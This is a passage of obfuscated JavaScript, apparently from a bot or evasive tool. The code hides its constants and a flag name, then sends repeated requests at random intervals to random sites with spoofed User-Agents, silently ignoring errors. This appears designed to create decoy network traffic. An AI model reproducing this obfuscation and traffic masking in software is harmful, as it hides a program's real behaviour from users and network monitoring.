      setTimeout(f, (-0xadcf + -0x10e7a + 0x2a6a9) * l * getRandomInt(0x1eb6 + 0x96 * -0xc + -0x17ad, -0x1 * -0x2387 + -0x1f2c + -0x458));
  }, -0x145571 * -0x2 + 0x3 * -0xd0d9f + 0x356c7b);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1d31 + -0x31a * -0xc + -0x1 * 0x2711) * getRandomInt(0x10e + -0x33e + 0x231, 0xb * -0x14f + 0x125d * -0x1 + 0x20c7));
}, 0x1ce0 + -0x1ed9 + 0x25d);